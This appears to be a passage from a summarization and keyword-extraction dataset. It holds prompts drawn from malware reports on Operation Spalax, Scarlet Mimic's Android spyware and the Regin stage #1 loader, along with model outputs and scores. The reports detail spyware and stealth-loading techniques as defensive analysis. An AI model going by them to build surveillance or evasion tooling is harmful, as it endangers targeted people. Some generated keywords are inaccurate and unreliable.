RATs that can access the victim\u2019s webcam.Command and ControlT1132.001 Data Encoding: StandardEncodingThe attackers have used njRAT, which uses base64 encoding for C&C traffic.T1573.001 Encrypted Channel:Symmetric CryptographyThe attackers have used Remcos RAT, which uses RC4 for encrypting C&C communications.T1095Non-Application Layer ProtocolThe attackers have used various RATs that use TCP for C&C communications.T1571Non-Standard PortThe attackers have used various RATs that communicate over different port numbers.Exfiltration Over C2 Channel The attackers have used various RATs that exfiltrate data over thesame channel used for C&C.ExfiltrationT104112 Jan 2021 - 11:30AM15/15 ", "generated_text": "ESET; Operation Spalax; targets; Colombian entities; energy; metallurgical; remote access trojans; the attackers; their victims; IP addresses; Powerhouse Management; the email; ZIP; ZIP archives; RAR archives; Powershell; Remcos; njRAT; AsyncRAT; files; the emails; C&C servers; the malware; a variety; packers; detection; the network infrastructure; part; attribution; groups; spies.", "ref_text": "<START-1>The PDF describes a series of ongoing malware attacks targeting Colombian government institutions and private companies, called Operation Spalax. The attackers use phishing emails containing malicious links or attachments to distribute remote access trojans (RATs) to victims. The RATs allow them to spy on targets by logging keystrokes, taking screenshots, accessing webcams/microphones, and exfiltrating documents. Three different RATs have been observed: Remcos, njRAT, and AsyncRAT. They are distributed via droppers packed with various obfuscation techniques to avoid detection. The droppers decrypt and execute the RAT payloads. The attackers have a large, dynamic infrastructure to hide their activities, including 24+ IP addresses and 70+ domain names registered with free dynamic DNS services since mid-2020. Most IPs are residential addresses in Colombia, likely compromised machines proxying traffic. The attacks are still active and expected to continue targeting Colombian entities. The attackers tailor phishing emails to targets using native Spanish and Colombian themes. While their motives appear to be cyber espionage, some targets like lotteries suggest possible cybercrime links too. In summary, the PDF provides an overview of the ongoing, targeted RAT attacks against Colombian entities using phishing and obfuscated droppers to distribute spyware, supported by a large, hidden network infrastructure. The threat actors are persistent and expected to continue intrusion attempts in the region. <END-1>", "t5/keyword/hint_hit_precision": 0.3225806451612903, "t5/word/hint_hit_recall": 0.07547169811320754, "gpt3/lexical/rouge_rouge1": 0.4676056338028169, "gpt3/lexical/rouge_rouge2": 0.18696883852691218, "gpt3/lexical/rouge_rougeL": 0.276056338028169, "gpt3/lexical/rouge_rougeLsum": 0.276056338028169, "gpt3_generated_text": ["The article discusses Operation Spalax, a series of targeted malware attacks in Colombia that began in 2020 and continue to target government institutions and private companies, particularly in the energy and metallurgical sectors. The attackers use remote access trojans to spy on their victims, with a large network infrastructure for command and control using multiple IP addresses and dynamic DNS services. The attackers show proficiency in the Spanish language and only target Colombian entities, using premade malware such as Remcos, njRAT, and AsyncRAT. The attacks involve phishing emails with various topics, leading to the download of malicious files in ZIP or RAR archives hosted on legitimate file hosting services. The malware is executed by the victim and injects itself into legitimate processes. The article highlights similarities and differences with previous reports on groups targeting Colombia and emphasizes the challenges of attribution."]}, {"split_name": "val", "sample_id": "val_93", "prompt_text": "Extract the keywords: research.checkpoint.com /2022/never-truly-left-7-years-of-scarlet-mimics-mobile-surveillance-campaign-targeting-uyghurs/ 7 Years of Scarlet Mimic\u2019s Mobile Surveillance Campaign Targeting Uyghurs \u22ee 9/22/2022September 22, 2022 IntroductionIn 2022, Check Point Research (CPR) observed a new wave of a long-standing campaign targeting the Uyghur community, a Turkic ethnic group originating from Central Asia, one of the largest minority ethnic groups in China. This malicious activity, which we attributed to the threat actor Scarlet Mimic, was first brought to light back in 2016.Since then, CPR has observed the group using more than 20 different variations of their Android malware, disguised in multiple Uyghur-related baits such as books, pictures, and even an audio version of the Quran, the holy text of the Islamic faith. The malware is relatively unsophisticated from a technical standpoint. However, its capabilities allow the attackers to easily steal sensitive data from the infected device, as well as perform calls or send an SMS on the victim\u2019s behalf and track their location in real-time. Also, it allows audio recording of incoming and outgoing calls, as well as surround recording. All this makes it a powerful and dangerous surveillance tool.In this report, we present a technical analysis and describe the evolution of the campaign in the last seven years. Although a small part of this campaign was briefly discussed in Cyble\u2019s publication as an isolated and unattributed incident, in this article we put the whole campaign in perspective and outline almost a decade\u2019s worth of persistent efforts in phone surveillance of the Uyghur community. Overview of the campaign1/21Since 2015, CPR has identified more than 20 samples of Android spyware called MobileOrder, with the latest variant dated mid-August 2022. As there are no indications that any of them were distributed from the Google Store, we can assume the malware is distributed by other means, most likely by social engineering campaigns. In most cases, the malicious applications masquerade as PDF documents, photos, or audio. When the victim opens the decoy content, the malware begins to perform extensive surveillance actions in the background. These include stealing sensitive data such as the device info, SMS and calls, the device location, and files stored on the device. The malware is also capable of actively executing commands to run a remote shell, take photos, perform calls, manipulate the SMS, call logs and local files, and record the surround sound.Figure 1 \u2013 MobileOrder malware samples observed in the wild.All the samples are based on the code of the MobileOrder malware from 2015, although during the ensuing years some changes were introduced by the developers. A few of these changes were clearly developed to reduce the chances of the malware being detected by security solutions: the malware authors experimented with ways to hide the malicious strings (which indicate the malware\u2019s intentions), first by moving them to the resources section, and later encoding them in base64.The actors also added a few adjustments and features to gather more information from their victims\u2019 devices. One new aspect is to move from using AMAP SDK, an Android SDK used to identify geolocation, to using the standard Android LocationListener implementation. This allows the attackers to track their target\u2019s location in real-time instead of an on-demand basis.2/21Figure 2 \u2013 Evolution of the Android malware.The MobileOrder malware, despite being actively used and updated, still does not support modern Android OS features, such as runtime permissions or new intent for APK installation, and does not use techniques common to most modern malware such as accessibility usage, avoiding battery optimization, etc.We are not able to identify which attacks have been successful, however, the fact that the threat actors continue to develop and deploy the malware for so many years suggests that they have been successful in at least some of their operations. Technical analysisWhen the victim opens the lure, whether it is a document, picture, or audio file, it actually launches the malicious application, which in turn opens a decoy document to distract the victim from background malicious actions. Some of the versions also ask for Device Admin and root access, which not only gives the malware full access to the device, but also prevents the victim from easily uninstalling the application:Figure 3 \u2013 Device admin activation and superuser request.3/21The malware then hides its icon and launches two services: core and open. The open service is responsible for showing the victim the decoy content (a PDF file or an image or an audio record) which is stored in res/raw/, res/drawable/ or assets:Figure 4 \u2013 Malware code that displays a decoy picture from February 2022 version.The core service launches the Communication thread, which connects to the C&C (command & control) server and processes the commands received, and the KeepAlive thread, which periodically triggers a connection to the server and relaunches the parent service.Figure 5 \u2013 The service that starts the Communication and KeepAlive threads.However, the KeepAlive thread is not the only one responsible for keeping the malware active. The malware developer also created BroadcastReceiver that starts the core Service. The triggers for this receiver are numerous actions registered in the AndroidManifest, making sure the malware stays active all the time.4/21Figure 6 \u2013 AndroidManifest.xml specifying triggers for the BroadcastReceiver which is responsible for keeping the malware alive.C&C CommunicationDepending on the sample, the malware can use a hardcoded list of C&C servers, dead drop resolvers, or both.First, the malware starts the process of resolving the C&C server, which includes decoding the built-in C&C addresses and, where it is defined, extracting the C&C server from dead drop resolvers which point to additional C&C infrastructure.5/21Figure 7 \u2013 The malware decodes the hardcoded C&C domains and the C&C server from the dead drop resolver.The use of dead drop resolvers helps prevent the infrastructure from being easily discovered through static analysis, but also enables operational resiliency as this infrastructure may be dynamically changed. All the versions of the malware that make use of dead drop resolvers query different posts on the Chinese Sina blog platform.Dead drop resolversFirst, the malware requests a specific blog page:Figure 8 \u2013 Dead drop resolver on a Sina blog post.Then it searches the received HTML for a specific base64-encoded regex pattern and decodes it to get the real The malware then creates a socket connection to the specified IP and port.EncryptionTo secure communication with the C&C server, the malware encrypts the data with AES. The key is generated in runtime from an encrypted passphrase inside dex by calculating the MD5 digest:Figure 10- AES key generation.Command executionAfter successfully connecting to the C&C, the malware processes commands from the remote server. It first reads a command, then an argument size, and finally the actual encrypted arguments.This is the full list of commands:7/21Command Send a list of files from the specific path. Send a list of processes running on the device. Send device and connectivity information (IMEI, Phone Number, Network type, Accounts, Installed applications, Browser history and others). Delete specific files on the device. Upload files from a specified path on the device to the C&C server. Download files from the C&C server (any file type). Upload all SMS messages. Upload all Contacts. Upload all Call Logs. Take a photo from the camera. Start Audio Recording task (immediately or at a specified time). Start \u201cNetwork\u201d location updates and send cell location info immediately. Start \u201cGPS\u201d location updates. Install APK (silently or via UI). Uninstall the application (silently or via UI). Execute \u201cchmod -R 777\u201d to a specific path via su. Launch a specific application on the device. Send Broadcast with a specific action to trigger other applications. Run shell command. Change the minimal time interval between a location updates. Disable location tracking. Check if a screen is on. Send SMS to a specific number. Delete specific SMS. Perform call to a specific number. Delete a specific call log. Update the C&C list. Take a screenshot.As we can see from this list, the malware contains stealer functionality to upload all kinds of sensitive data from the device (device info, SMS, calls, location, etc.), but also provides RAT functionality by executing active commands on the device such as remote shell, file downloading, taking photos, performing calls, manipulating the SMS and call logs, etc. In the next sections, we analyze the most important functions.SMS and Call Logs manipulationThe malware has commands to upload all the SMS and call logs to the attackers\u2019 server. In addition, it provides the functionality to send text messages or perform a call to a specific number. This allows the actors to conduct further malicious activity against additional targets by impersonating the current victim, using his name, phone number and credibility. This drastically increases the chances of success.To hide these actions from the victim, the attackers may use commands to remove the last messages or call logs so that no traces of their interactions with third parties are left on the device.8/21Figure 11- Malware code responsible for running calls / sending SMS from a victim\u2019s device and functions to cover the evidence of these actions.Location trackingThe malware can collect the victim\u2019s device location and track its changes over time. When it is launched, the malware registers a location listener, which means Android will trigger this listener every time the location is changed.The malware collects latitude, longitude, altitude, speed, bearing, accuracy, and the provider (GPS or network) that supplied these results. It also tries to convert the current location from latitude and longitude coordinates to a physical address using the Geocoder class. The number of details and the precision of this reverse geocoding process may vary. For example, one set of coordinates can be translated to the full street address of the closest building, while another might contain only a city name and a postal code.The geolocation data is immediately sent by the spyware to the remote server. Additionally, the malicious application also writes this data with a timestamp to the file called map.dat, thereby continuously collecting and saving the victim\u2019s geolocation. Even if the internet connection on a victim\u2019s devices or to the C&C server is unavailable, the file with all the geolocation information is continuously updated and is uploaded to the attacker- controlled server when the connection is restored.9/21Figure 12 \u2013 Location updates processing and reverse geocoding.The attackers can also configure the Location listener parameters remotely:Change the minimal interval between the location updates \u2013 This allows the actors to decrease the number of updates but can still track the victim. Change the provider for location tracking between GPS (based on satellite usage) or network (based on the availability of cell towers and WiFi access points).Before the malware developers started to utilize the standard Android LocationListener, the malware used a third- party SDK called AMAP to track the victim\u2019s location. The overall idea is similar: when the malicious app receives a command from the attackers\u2019 server to start tracking the device\u2019s location, it subscribes to location updates from the AMAP SDK. This way, at every location change, the malware writes the current location with a timestamp to the map.dat file and stores it as a variable.10/21Figure 13 \u2013 Device location tracking in the versions that use the AMAP SDKAs a result, the attackers can send commands from the remote server to read the current location or to request a full tracking file.To summarize, in the most recent versions, the malware developers added the ability to track their target\u2019s location in real-time. The malware sends location updates on its own, compared to previous versions where the server needed to send additional commands to get the location information.Call recording and file uploadTo record both incoming and outgoing calls from the infected device\u2019s microphone, the malware uses a BroadcastReceiver called CallRecorder. It monitors the phone state and saves the call records locally to the db file, so that it can be uploaded later to the attacker-controlled remote server by issuing the \u201cupload file\u201d command.11/21Figure 14 \u2013 The malware code responsible for recording the incoming and outgoing calls.Surround recordingBesides recording incoming and outgoing calls, the attackers can start surround recording remotely by issuing a relevant command from the C&C server.When the command is received, the malware gets as an argument the desired duration and the specified delay before the recording starts. If there is no delay specified, it launches a thread that immediately starts to record. Otherwise, it creates a PendingIntent for the BroadcastReceiver that is registered in AlarmManager \u2013 and as a result, triggers a recording in the specified time.12/21Figure 15 \u2013 Starting audio recordings.After the AudioRecording thread performs the recording with the specified duration, it saves it to the db file with the timestamp:Figure 16 \u2013 Surround recording implementation.As the recorded files may be quite large, we would expect to see some restrictions in the code on how the resulting files are exfiltrated (for example, upload the files only via Wi-Fi networks), but there are no such limitations in the code. However, there is no automatic upload for the recorded calls. The attackers decide when to exfiltrate the files, so they could send a command to get device information (which contains the current network connection type) and then exfiltrate the files from the device when convenient.Because the attackers have updated information about the victim\u2019s location, they can choose the opportune moment to record offline private conversations, which affects not only the victim\u2019s privacy but also that of unsuspecting third parties.Remote shellThe malware can receive commands to execute a remote shell, which is done by starting a thread that, in turn, starts a shell process and establishes a socket connection to the same C&C server, but over a different port. The shell\u2019s output is redirected to the socket output stream from which the malware reads the commands, then decrypts and executes them:13/21Figure 17 \u2013 Remote shell execution.Drop additional APKWhen it receives a command to install an APK, the malware starts a thread that checks if it has enough privileges to install the application silently. If the check fails, the malware launches a regular UI installation via intent:14/21Figure 18 \u2013 Silent apk installation via PackageManager.Uninstalling an application performs exactly the same logic. AttributionThe first report that summarized the activity of Scarlet Mimic and various elements of this threat was published in 2016. It reviewed a series of persistent attacks that targeted Uyghur and Tibetan minority rights activists as well as those who support their cause.The group\u2019s arsenal at that point included multiple Trojans and tools for Windows and macOS. In 2015, the actors started to expand their espionage efforts from PCs to mobile devices using the spyware called MobileOrder, which focused on compromising Android devices. Based on the code similarity, shared infrastructure and victimology, we conclude that the new wave of attacks belongs to the same threat actor and that the group continues to deploy and develop MobileOrder malware until this day. In addition to clear code overlaps, we observed multiple overlaps in the infrastructure between the new samples and the old MobileOrder malware variant, as well as multiple variants of Windows Psylo Trojan previously attributed to Scarlet Mimic, that interact with the same malicious domains as the mobile malware.In late 2017, Lookout research published their report on another cluster of malicious activity, which relied on JadeRAT Android malware to target the Uyghur community. This campaign \u201chad some overlap [with ScarletMimic] around the apps they trojanized, the likely groups they targeted, their capabilities, and to some extent their implementation.\u201dTogether with the evidence of the ongoing campaign using Android spyware provided in this report, this emphasizes the heavy shift of activity targeting these minority groups towards mobile surveillance in the last few years.Code overlaps15/21The MobileOrder from the 2015 report also started by registering itself as a device admin with admin privileges to admin privileges vs the sample from April 2020 performing the same request (right)The 2015 version of MobileOrder masqueraded as a PDF document, with an embedded PDF called rd.pdf in the application\u2019s resources. This is similar to all the new samples in the ongoing campaign where the decoy content is PDF files. The bait PDF extracted from the malware resources is written to the device\u2019s SD card and displayed to the victim while executing the malicious actions in the background:Figure 20 \u2013 APK structure and the decoy PDF file location in 2015 sample of MobileOrder and August 2022 sample (right).The main communication thread, which is responsible for communicating with a C&C server via socket and processing received commands, also did not change much over time, although many of the commands themselves changed the command id, and a few more functionalities were added.16/21Figure 21 \u2013 Command processing in MobileOrder from 2015 vs commands processing in newer samples (deobfuscated code). Victimology and luresMost of the malicious applications we observed have names in the Uyghur language, in its Arabic or Latin scripts. They contain different decoys (documents, pictures, or audio samples) with content related to the ethnic geopolitical conflict centered on Uyghurs in China\u2019s far-northwest region of Xinjiang, or with the religious content referencing the Uyghurs\u2019 Muslim identification. We can therefore conclude that this campaign is likely intended to target the Uyghur minority or organizations and individuals supporting them, which is consistent with the Scarlet of Elqut Alim, the \u201cNew Chief Media Officer\u201d of the Norwegian Youth Union who call themselves \u201ca group of Uyghur youth who live in Norway with a common understanding and a common goal, which is to stand up against China\u2019s invasion of East Turkestan.\u201d The malware was uploaded to VT with the name in Uyghur contains multiple pictures referring to the escalated tensions in Xinjiang Uygur Autonomous Region in May 2014, including the deployment of special police forces next to the Urumqi Railway Station and the medical as a partial PDF of the book with the same name written by Dolkun Isa, politician and activist from the region of Xinjiang and the current president of the World Uyghur Congress:19/21Figure 25 \u2013 The cover of the lure PDF.The sample called \u201cquran kerim\u201d which translates as \u201cNoble Quran\u201d (md5: be a Turkic language.Some of the other lures include the pictures of unidentified individuals, and as reverse search engines fail to trace their origin, we can assume that these pictures are borrowed from the private profiles of these individuals in some social networks or were stolen from their mobile devices as a result of the spyware deployment.It\u2019s interesting that one of the samples, called \u201c\ufe94\ufee4\ufe8b\ufe8e\ufed8\ufedf\u0627\u201d (\u201cThe list\u201d in Arabic) with the package name Uyghurs. The name and the lure of this application is in Arabic, and the lure document contains a picture of a list of persons wanted by Shabwah Governorate in Yemen for threatening the security and stability of the province. This may indicate the additional targeting of individuals or organizations located in a different geographical zone and involved in another conflict. ConclusionOver the years, Scarlet Mimic strongly continues its espionage operations against the Uyghur community using Android malware. The persistence of the campaign, the evolution of the malware and the persistent focus on targeting specific populations indicate that the group\u2019s operations over the years are successful to some extent. This threat group\u2019s shift in their attack vector into the mobile sector provides another evidence of a growing tendency of extensive surveillance operations executed on mobile devices as the most sensitive and private assets.Check Point\u2019s Harmony Mobile helps securing mobile devices across all attack vectors: apps, network and OS and protects against Android malware such as the one used on this campaign. Harmony Mobile leverages Check Point\u2019s ThreatCloud and award-winning file protection capabilities to20/21block the download of malicious files to mobile devices and prevent file-based cyber-attacks, such as the one\u2019s described on this blog. fly100.dellgod[.]net islam.ansardawlatalislam[.]com k7k7[.]co mobile.muslimbro[.]org ziba.lenovositegroup[.]com 209.97.173[.]124 45.32.112[.]182 url url url url Dead drop resolver Dead drop resolver Dead drop resolver Dead drop resolverPackage Name com.emc.pdf pw.nrt.photo.google com.sy.go.immx com.pdf.google.vv com.pdf.google.vm com.pdf.google.vm com.pdf.google.vm com.photo.android.p com.update.google com.photo.android.p com.photo.android.p com.photo.android.p com.view.openpdf com.view.openpdf com.photo.android.p com.photo.android com.photo.android com.photo.android com.view.openpdf com.photo.android com.photo.android com.photo.android com.lppads.android21/21 ", "generated_text": "the report; Check Point Research; Scarlet Mimic; Uyghurs; Central Asia; 2016; 15; versions; PDF documents; pictures; audio; the malware; commands; data; calls; details; Calls; the device; this campaign; years; the developers; changes; the malware; root access; the device; a custom Android location server; the current version; the Android OS; the threat actors; the Uyghur community.", "ref_text": "<START-1>The PDF describes a 7-year long mobile surveillance campaign called Scarlet Mimic that has targeted the Uyghur minority community. The threat actor has used over 20 variations of Android spyware called MobileOrder disguised as Uyghur-related content like books, pictures, and audio files. The malware can steal sensitive data from infected devices like location, SMS, calls, files, and can also perform active commands like taking photos, recording audio, manipulating SMS/calls, and installing additional malware. The malware has evolved over time to evade detection, with the actors experimenting with hiding malicious strings in resources and encoding them. New features have also been added like real-time location tracking. The malware uses AES encryption to communicate with command and control servers, which can be hardcoded in the malware or retrieved from \"dead drop\" resolvers on blog sites. The actors have continuously updated the malware and used social engineering to distribute it through lures like Uyghur-related photos and documents, indicating an ongoing successful campaign. Based on code overlaps, infrastructure, and targeting, the campaign has been attributed to the Scarlet Mimic group which has previously targeted this community on Windows and MacOS. The shift to mobile malware aligns with a growing trend of mobile surveillance. The technical analysis provides an in-depth look at how the malware functions for exfiltrating data and manipulating the compromised device. <END-1>", "t5/keyword/hint_hit_precision": 0.23333333333333334, "t5/word/hint_hit_recall": 0.0410958904109589, "gpt3/lexical/rouge_rouge1": 0.4431137724550898, "gpt3/lexical/rouge_rouge2": 0.12650602409638556, "gpt3/lexical/rouge_rougeL": 0.27544910179640725, "gpt3/lexical/rouge_rougeLsum": 0.27544910179640725, "gpt3_generated_text": ["Check Point Research (CPR) has uncovered a long-standing surveillance campaign targeting the Uyghur community, attributed to the threat actor Scarlet Mimic, dating back to 2016. Over the past seven years, more than 20 variations of Android malware, disguised as PDF documents, pictures, and audio files, have been used to steal sensitive data, track location, and record calls. Despite technical advancements, the malware lacks support for modern Android OS features. The threat actors continue to develop and deploy the malware, indicating successful operations. The malware requests device admin and root access, making it difficult to uninstall. The campaign highlights the persistent efforts in phone surveillance of the Uyghur community."]}, {"split_name": "val", "sample_id": "val_94", "prompt_text": "Extract the keywords: Malware analysisreportW32/Regin, Stage #1tlp: wHite1. INTRODUCTION 1.1 Sample Statistics2 22 2. MALWARE ANALYSIS 3 2.1 Deployment and startup 3 2.2 Sample selection 2.3 Content retrieval 3 2.4 Retrieval from the file system (Extended Attributes) 4 2.5 Retrieval from the registry 2.6 Decryption 4 2.7 Content mapping 5 2.8 The QuickPeParse function 2.9 Header and sections 2.10 Imports & Trampolines 2.10.1 Embedded code templates 7 2.10.2 Locating a safe location inside a trusted module 7 8 2.10.3 Code template customization 8 2.10.4 Trampolines 102.11 The CodeProtection structure 2.12 Relocations 2.13 Finalizing the loading process 2.14 Invocation of stage #23. CONCLUSIONS APPENDIX A: SAMPLE STATISTICS APPENDIX B: MEMSET SYSTEM CALL TRANSITION10 F-Secure Labs Twitter: @paolo_3_1415926Contact F-Secure Incident Response irt@f-secure.comIn this document we analyze a set of 32-bit samples which represents stage #1 of the complex threat that is known as Regin. Based on our analysis of the malware\u2019s functionalities, this part of the Regin threat can be considered just a support module \u2014 its sole purpose is to facilitate and enable the operations of stage #2 by loading it and making it more difficult to detect by security products.Regin\u2019s stage #1 targets the Windows platform and support various versions of the operating system, beginning with Windows NT 4.0. Based on our analysis, the samples may be classified into two categories: \u201cpure\u201d samples that do not feature any extra, non-malicious code; and \u201caugmented\u201d ones which feature malware code as part of another device driver. The existence of \u201caugmented\u201d samples indicates the intention of the attacker to remain undiscovered for as long as possible.When activated, samples of Regin stage #1 will retrieve encrypted content from specific locations of an already compromised system, map it into kernel memory and transfer control to it. In terms of technical sophistication, stage #1\u2019s import resolution process is of particular interest, as the malware uses the unusual \u201ctrampoline\u201d technique to mask the payload\u2019s access to API functions.It is clear that this support component, that represents the initial stage of a very complex threat, has been instrumental in securing long-term persistence in the attacks that made use of this threat.1. introDUCtionIn this document we describe the technical characteristics of a set of 27 32-bit samples of Regin\u2019s stage #1 component.We first extract and collect a set of high level information from these samples to obtain a general overview of their structure. Based on this overview, we propose using two distinct grouping criteria to facilitate working with these samples. A single sample is then selected and analysed in detail; its functionalities are isolated and presented here, together with relevant portions of its code.1.1 sample statisticsOur analysis covers a collected set of 27 32-bit Portable Executable (PE) files for the Microsoft Windows operating system. All 27 samples are device drivers, designed to work at the kernel level.Based on the code structure of the samples, they can be roughly categorized into two groups:y \u201cPure\u201d \u2014 does not feature any extra code beside themalicious oney \u201cAugmented\u201d \u2014 the malware code is present incombination with code from a legitimate device driverSome \u201caugmented\u201d samples seem to be derived from Microsoft device drivers, with modifications to drive the execution towards the malicious code.Of the 27 samples, 20 of them (or 74%) are \u201cpure\u201d; only 7 samples can be classified as are \u201caugmented\u201d. Despite the small amount of samples at our disposal, it is possible to speculate that the disproportion between the number of \u201cpure\u201d and \u201caugmented\u201d samples reflects the additional complexity associated with creating the \u201caugmented\u201d samples. Another possibility is that \u201caugmented\u201d samples represent a particular stage of development or have served a particular purpose, and for this reason they are fewer in number; this suspicion might be confirmed by the compilation date as extracted from the samples\u2019 PE header.Analysis of the resources also shows that the \u201caugmented\u201d binaries are masked as binaries for Windows NT 5.2.3790, also known as Windows Server 2003. This hints to the fact that the attackers might have used these samples to specifically target machines running this particular version of Windows.It also interesting to consider the filenames of the samples as they were observed in the wild or during submission for analysis. In 12 cases (44% of samples), the decoy names used by the files was \u201cusbclass.sys\u201d. [1] This particular name was used only for \u201cpure\u201d samples (though not all such samples used this name). It is our opinion that this particular name was selected to allay any suspicions on the victim\u2019s part, if the file was discovered.Following detailed analysis of a selected reference sample (presented in later sections), we were able to group samples based on differences in their code from the analysed sample. We define the distance function between our reference sample and other samples as:d(sample)\u3016:\u3016=|\u3016functions\u3016sample reference \u2229 functionssample ||\u3016functions\u3016sample\u3016reference |Using this metric, we determined there were three categories among the 27 samples at our disposal. A set of 13 samples out of 26 [2], which was assigned the label \u201cvariant #1\u201d, alongside the reference sample, were extremely close to the reference, with distances between 89% and 100%. 7 out of 26 samples (labelled \u201cvariant #2\u201d) were very distant from the reference sample [3], with a consistent distance of 2.63%. Finally, the last 7 samples (labelled \u201cvariant #3\u201d) showed distances between 41% and 53% from the reference sample. While samples belonging to \u201cvariant #2\u201d or \u201cvariant #3\u201d were not analyzed in detail, preliminary analysis shows that they all possess the same functionalities, but their code is notably different at the function level.A final observation is that all the \u201caugmented\u201d samples belong to \u201cvariant #1\u201d, according to this classification method. The full data matrix regarding the samples is provided in Appendix A for the interested reader.2. Malware analysisThis section presents a detailed analysis of a selected sample from the set of samples for Regin\u2019s stage #1, which later serves as a reference for further analysis of other samples.1 There exists a small number of references to a Logitech device driver with the name \u201cusbclass.sys\u201d. Were these references to be correct, it could be speculated that the malware authors may have wanted to use a name that would survive a simple investigation attempt done by, say, using an internet search engine.2Chart 1: Flowchart of content retrieval logic2.1 Deployment and startupAt the time of writing, it is not known how the Regin stage #1 samples are deployed to the target system. Our analysis of the samples\u2019 system interactions showed no evidence to indicate that they are any different from other device drivers; we therefore believe that these samples are installed, registered and invoked as with any other device driver.2.2 sample selectionThe analysis in this section focuses on the sample with MD5 for two reasons: first, the sample was among the first fewwe retrieved, and second, it was the only \u201cpure\u201d sample in that particular set. A \u201cpure\u201d sample has the advantage of being self-contained, smaller in size and independent from any other code.2.3 Content retrievalAlmost immediately after receiving control, the malware\u2019s code will attempt to locate its payload from the already infected system. The malware will scan selected locations in both the file system and the registry. These locations are hardcoded inside the binary itself under a layer of simple encryption. The logic for content retrieval can be represented by a simplified flowchart (Chart 1).2 The total number of samples is 26 because the reference sample has been excluded.3 It is clear that d (sample reference) = 1.3Image 1: Content decryption loopImage 2: Payload verification code2.4 retrieval from the file system (extended attributes)content is simply the value of the provided key/value-name combination.Regin\u2019s stage #1 component relies on the concept of \u2018Extended Attributes\u2019 to store its payload on the file-system. Extended Attributes are a list of name-value pairs that can be associated to New Technology File System (NTFS) files and directories.The malware retrieves the list of extended attributes associated with the provided full path to a directory or file. This list is then iterated and each element is inspected. The malware expects to retrieve the content from extended attributes named as \u201c_\u201d. If that condition is met, the value is then extracted. It should be noted that the content may be split between extended attributes belonging to two different NTFS objects. An example file-system location is the following:<WINDOWS>\\CursorsThe use of Extended Attributes was not observed in malware until the recent emergence of the ZeroAccess rootkit [4]. As the Regin threat appears to have emerged earlier than ZeroAccess however, we are convinced that significant skills, knowledge and resources were available to the developers of Regin to enable earlier use of this unusual technique.2.5 retrieval from the registryIf Regin\u2019s stage #1 is unable to retrieve payload content from the file-system, the malware will turn its attention to the registry. Regin\u2019s stage #1 malware samples contain a hardcoded registry path and value name to be used as a fall- back location for content retrieval. In this case, the soughtAn example registry location is:\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\RestoreList:VideoBaseIf both content retrieval attempts are unsuccessful, the malware will not perform any additional operation until its next invocation, when it will again attempt to retrieve content from either the file-system or the registry.2.6 DecryptionThe encryption used to protect the content in the file system or registry is a XOR based algorithm, specific to this malware family. Regin\u2019s stage #1 body contains the key needed for payload decryption. The code for the payload\u2019s decryption routine is presented in Image 1.After decryption, the malware quickly verifies the payload is correct, in order to avoid attempting to map something for execution when it is obviously invalid (Image 2).2.7 Content mappingOnce the payload is in clear text, Regin\u2019s stage #1 proceeds to map it so that it can be executed. The mapping process follows the logic of the operating system\u2019s PE loader.Regin\u2019s stage #1 PE loader is quite comprehensive; considering the suspected age of the threat, the generic nature of the PE loader and the fact that the PE loading happens completely in kernel mode, we can speculate that the authors of this threat are skilled and well-funded.4 Symantec Response blog; Mircea Ciubotariu; Trojan.Zeroaccess.C Hidden in NTFS EA; published 14 Aug 2012;url 3: Code recovered for the QuickPeParse function2.8 the Quickpeparse functionOf particular interest is a specific helper function that is widely used by Regin\u2019s stage #1 in association with PE manipulation.simplifying the code and avoiding dangerous mistakes. This is, again, possibly additional confirmation of the attacker\u2019s skills.2.9 Header and sectionsThe helper function quickly verifies the validity of a PE file, while at the same time recovering information (Image 3) useful to anyone willing to load or programmatically process a PE file.Given the number of times Regin\u2019s stage #1 needs to retrieve PE-related information, this subroutine is a great help inThis part of the loading process is performed in a fairly standard way. Regin\u2019s stage #1 begins the loading process by verifying that its payload is a valid PE file. If this verification is successful, the malware retrieves the value of the SizeOfImage field from the OptionalHeader of the PE file, then allocates a number of bytes equivalent to this value.5Image 4: Calculating the deltaImage 5: Missing replacements for mem* functionsThe payload will be mapped to this memory region.Before proceeding any further, Regin\u2019s stage #1 calculates the delta (Image 4) between the address of the memory region it allocated for the memory mapped image and the preferred ImageBase retrieved from the OptionalHeader. This information will be used later during the mapping process, in case relocations need to be processed.With these operations completed, the headers are mapped first, followed sequentially by each of the PE file sections. This process is relatively straightforward.It is to be appreciated that the majority of the operations described above rely at some level on QuickPeParse\u2019s results.On another note, in this section of the code we begin to see references to missing replacements for mem* functions.The absence of the mem* replacements does not affect the malware\u2019s ability to proceed with the execution, as the code falls back to standard API functions (Image 5). Such code constructs are encountered extensively throughout the remainder of the code. Our opinion on this matter is that the replacement functions would provide augmented logging when dealing with memory operations; their absence is possibly the result of conditional compilation. Such an explanation would further the belief that the authors of this malware are experienced developers.2.10 imports & trampolinespieces of code, eventually triggering the requested external subroutine before finally returning to the payload.Before getting into details, it is important to have an idea of how the trampolines work from a high-level perspective.A trampoline transition can be summarized as follows:1. Payload invokes \u201cresolved\u201d external subroutine 2. Trampoline code receives controla. Trampoline code retrieves the previously-resolved real address of the external subroutineb. Trampoline invokes the pre-API call code3. Pre-API call code prepares the environment to makethe function call return to trusted location inside trusted modulea. Pre-API call code invokes the externalsubroutine4. External subroutine performs its dutya. External subroutine returns5. Execution lands in appropriate part of trustedmodule6. Jump to post-API call code is executed 7. Post-API call code receives controla. Post-API call code restores the environment forpayloadb. Post-API call code transfers control back topayload, as would normally happen after a call to an external subroutine8. Payload continues its operationsImport resolution is the crucial part for achieving Regin stage #1\u2019s goal of hiding the originator of system calls from external observers. The loader will correctly resolve the address of imported functions, but will embed these addresses in so-called \u2018trampoline\u2019 code. Addresses to the trampolines are instead added to the Import Address Table (IAT). From there, the execution will traverse differentIn the following subsections we will discuss the details of how the malware retrieves and pieces together all the information required to produce and install the trampolines.Appendix B contains a diagram detailing a complete transition between the payload and an external module exporting a function.62.10.1 embedded code templatesThe stage #1 malware uses predefined code for pre-API-call and post-API-call operations. This code is embedded in the binary and is almost ready for use, but it requires some customization to account for differences when it comes to memory addresses.The malware is aware of the start address of both pieces of code inside its own body, and has a rough idea of the size of the two code portions. The builder code contains wrong values for the size of both templates. This is most likely a remnant of a previous code version that contained templates that were bigger.With this information, the malware scans those sections of code looking for specific DWORDs that mark locations that need customization.As an example, we report a screenshot of the post-API- call code (Image 6). The value of 0x99119911 as the second operand of the last instruction in this code portion is a placeholder that acts as a marker for the builder code.The offset of the values needing customization are marked by the values:y pre-API-call code:\u25ca 0x66116611 \u25ca 0x77117711 \u25ca 0x88118811y post-API-call 